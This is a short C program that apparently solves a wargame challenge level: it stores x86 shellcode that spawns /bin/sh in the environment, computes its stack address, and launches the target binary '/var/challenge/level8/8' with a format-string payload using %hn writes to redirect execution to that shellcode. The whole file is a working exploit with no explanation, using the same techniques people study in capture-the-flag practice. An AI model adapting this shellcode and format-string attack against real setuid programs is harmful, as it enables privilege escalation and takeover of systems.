#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define NOP 0x90
#define VULN "/var/challenge/level8/8"

char shellcode [] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void){


	unsigned int addr;	

	char *formatstring = "AA\x2a\xa0\x04\x08\x28\xa0\x04\x08%49135x%70$hn%16333x%71$hn";
	char *params [] = {VULN,formatstring,NULL};

	char *env [] = {shellcode, NULL};

	addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(shellcode) - 1;

	fprintf(stderr, "Using address: %#010x\n",addr);

	execve(params[0],params,env);
	perror("execve");
	exit(1);

}
